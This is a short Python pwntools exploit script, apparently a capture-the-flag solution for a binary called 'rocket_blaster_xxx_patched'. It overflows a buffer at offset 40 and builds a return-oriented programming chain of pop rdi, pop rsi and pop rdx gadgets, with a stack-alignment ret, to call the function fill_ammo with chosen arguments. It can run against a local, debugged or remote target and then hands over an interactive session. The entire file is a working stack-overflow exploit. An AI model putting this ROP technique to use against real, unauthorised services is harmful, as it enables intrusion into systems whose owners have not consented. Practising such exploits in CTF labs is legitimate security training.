#!/usr/bin/env python3

from pwn import *

e = ELF("./rocket_blaster_xxx_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(main+116)
                      b *(fill_ammo+0x14f)
                      c
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    rop = ROP(e)
    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    fill_ammo = e.symbols['fill_ammo']
    payload = flat({
        40: [
            pop_rdi, 0xdeadbeef,
            ret, # need this return to make the RSP aligned with 16 otherwise printf will throw errors
            pop_rsi, 0xdeadbabe,
            pop_rdx, 0xdead1337,
            fill_ammo,
            ],
        }, filler=b'\x90')
    r.sendlineafter(b'>>', payload)

    r.interactive()

if __name__ == "__main__":
    main()
